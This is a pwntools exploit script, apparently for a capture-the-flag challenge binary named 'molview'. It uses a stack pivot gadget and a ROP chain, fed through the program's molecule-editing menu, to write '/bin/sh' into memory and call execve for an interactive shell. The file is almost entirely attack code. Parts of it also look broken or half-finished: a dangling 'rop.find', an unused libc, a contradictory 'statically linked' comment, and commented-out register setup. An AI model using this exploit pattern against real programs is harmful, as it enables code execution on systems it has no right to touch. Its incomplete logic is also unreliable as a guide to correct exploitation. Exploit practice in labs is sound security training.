#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template /var/challenges/molview/molview
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF(args.EXE or '/var/challenges/molview/molview')
libc = ELF('/usr/lib/x86_64-linux-gnu/libc-2.31.so')  
rop = ROP(exe)

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:      Partial RELRO
# Stack:      Canary found
# NX:         NX enabled
# PIE:        No PIE (0x400000)
# SHSTK:      Enabled
# IBT:        Enabled
# Stripped:   No
# Debuginfo:  Yes


# Is there a stack pivot gadget?
chain = p64(0x0000000000472fa8) # leave; ret;
payload = 8 * b"D" + chain

# Is there a gadget that moves rbp into rdi?
gadget = rop.find

# Write /bin/sh to the data section
data_addr = exe.symbols['data']
print("Data section address: " + hex(data_addr))

# Binary is statically linked, so try to find useful gadgets
rop.raw(rop.find_gadget(['pop rdi', 'ret']))  # Set rdi (stdin)
rop.raw(0)  # File descriptor (stdin)
rop.raw(rop.find_gadget(['pop rsi', 'ret']))  # Set rsi (buffer)
rop.raw(data_addr)  # Buffer (writable section address)
# rop.raw(rop.find_gadget(['pop rdx', 'ret']))  # Set rdx (number of bytes)
# rop.raw(0x100)  # Read up to 256 bytes
rop.raw(0x0000000000422dd4) # mov rax, rdi; ret
rop.raw(rop.find_gadget(['syscall', 'ret']))  # Trigger the syscall
# return to main, so that we can execute the execve syscall in the next iteration
# rop.raw(rop.find_gadget(['pop rbx', 'ret']))  # Set rdi (stdin)
# rop.raw(0x403950)
# rop.raw(exe.symbols['main'])

# Make a syscall to execve for the l33t binary
rop.raw(rop.rdi.address)  # pop rdi; ret
rop.raw(data_addr)
# rop.raw(rop.rsi.address)  # pop rsi; ret
# rop.raw(0)  # NULL
rop.raw(rop.rdx.address)  # pop rdx; ret
rop.raw(0)  # NULL
rop.raw(rop.rax.address)  # pop rax; ret
rop.raw(59)  # execve syscall number
rop.raw(0x000000000049b8fe)
# syscall = rop.find_gadget(['syscall', 'ret']).address
# print('syscall gadget: ' + hex(syscall))
# rop.raw(syscall)
print(rop.dump())

rop_payload = 8 * b"\0" + rop.chain() + 4 * b"Z"

print("ROP chain: ", rop_payload)
print("ROP chain length: " + str(len(rop_payload)))

io = start()

# Set the data
io.sendline("1") # add atom
io.sendline("1") # add atom
io.sendline("1") # add atom
io.sendline("2") # change atom element
io.sendline("3") # change atom 3
io.sendline(payload)
io.sendline(rop_payload) # name of new molecule
io.sendline("3") # view molecule

input("Press Enter to continue...")
io.sendline(b"/bin/sh\x00")




io.interactive()

